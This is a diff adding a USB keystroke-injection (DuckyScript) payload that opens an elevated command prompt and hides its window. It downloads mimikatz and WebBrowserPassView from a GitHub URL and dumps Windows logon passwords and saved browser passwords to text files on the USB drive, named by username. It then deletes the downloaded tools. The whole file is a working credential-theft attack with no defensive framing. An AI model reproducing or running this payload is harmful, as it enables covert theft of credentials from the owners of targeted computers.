@@ -1,0 +1,50 @@
+DELAY 1000
+REM -------------Open up CMD as administrator
+GUI r
+DELAY 400
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 500
+REM -------------Hide the CMD
+ALT SPACE
+DELAY 300
+STRING f
+DOWNARROW
+REPEAT 150
+ENTER
+DELAY 400
+REM -------------download mimikatz
+STRING powershell (New-Object Net.WebClient).DownloadFile('https://github.com/vonlohmann/Mimikatz-I-DON-T-OWN-THIS-SO-GO-TO-THE-CREATER/raw/master/mimikatz.exe','%TEMP%\pw.exe');
+ENTER
+DELAY 2000
+REM -------------get the passwords and save to usb txt-file with username
+STRING %TEMP%\pw.exe > D:\"pass %username%".txt & type "pass %username%".txt;
+ENTER
+DELAY 500
+STRING privilege::debug
+ENTER
+DELAY 500
+STRING sekurlsa::logonPasswords full
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 300
+STRING del %TEMP%\pw.exe
+ENTER
+DELAY 1000
+REM -------------download WebBrowserPasswordViewer
+STRING powershell (New-Object Net.WebClient).DownloadFile('https://github.com/vonlohmann/Mimikatz-I-DON-T-OWN-THIS-SO-GO-TO-THE-CREATER/raw/master/WebBrowserPassView.exe','%TEMP%\pw.exe');
+ENTER
+DELAY 3000
+REM -------------get the passwords and save to usb txt-file with username
+STRING powershell %TEMP%\pw.exe /stext D:\'webpass %username%'.txt;
+ENTER
+DELAY 1000
+STRING del %TEMP%\pw.exe
+ENTER
+DELAY 300
+STRING exit
+ENTER
